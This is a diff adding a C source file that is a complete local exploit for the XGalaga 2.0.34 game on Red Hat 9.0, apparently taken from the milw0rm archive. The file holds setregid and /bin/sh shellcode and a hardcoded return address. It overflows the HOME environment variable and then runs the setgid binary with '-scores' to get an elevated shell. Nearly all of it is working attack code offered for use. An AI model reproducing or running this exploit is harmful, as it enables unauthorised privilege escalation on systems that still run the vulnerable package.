@@ -1,0 +1,77 @@
+/* 0x333xgalaga => XGalaga 2.0.34 local game exploit (Red Hat 9.0)
+*
+* tested against xgalaga-2.0.34-1.i386.rpm
+* under Red Hat Linux 9.0
+*
+* - bug found by Steve Kemp
+* - exploit coded by c0wboy @ 0x333
+*
+* (c) 0x333 Outsider Security Labs / www.0x333.org
+*
+*/
+
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+
+#define BIN "/usr/X11R6/bin/xgalaga"
+#define SIZE 264
+
+#define RET 0xbffffe2c /* tested against Red Hat Linux 9.0 */
+#define NOP 0x90
+
+
+unsigned char shellcode[] =
+
+/* setregid (20,20) shellcode */
+"\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47"
+"\xcd\x80"
+
+/* exec /bin/sh shellcode */
+
+"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+"\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
+
+
+void banner (void);
+void memret (char *, int, int, int);
+
+
+void banner (void)
+{
+fprintf (stdout, "\n\n --- xgalaga local GAME exploit by c0wboy ---\n");
+fprintf (stdout, " --- Outsiders Se(c)urity Labs / www.0x333.org ---\n\n");
+}
+
+
+void memret (char *buffer, int ret, int size, int align)
+{
+int i;
+int * ptr = (int *) (buffer + align);
+
+for (i=0; i<size; i+=4)
+*ptr++ = ret;
+
+ptr = 0x0;
+}
+
+
+int main ()
+{
+int ret = RET;
+char out[SIZE];
+
+memret ((char *)out, ret, SIZE-1, 0);
+
+memset ((char *)out, NOP, 33);
+memcpy ((char *)out+33, shellcode, strlen(shellcode));
+
+setenv ("HOME", out, 1);
+
+banner ();
+execl (BIN, BIN, "-scores", 0x0); // the switch "-scores" is necessary to exploit the game
+}
+
+// milw0rm.com [2003-07-31]
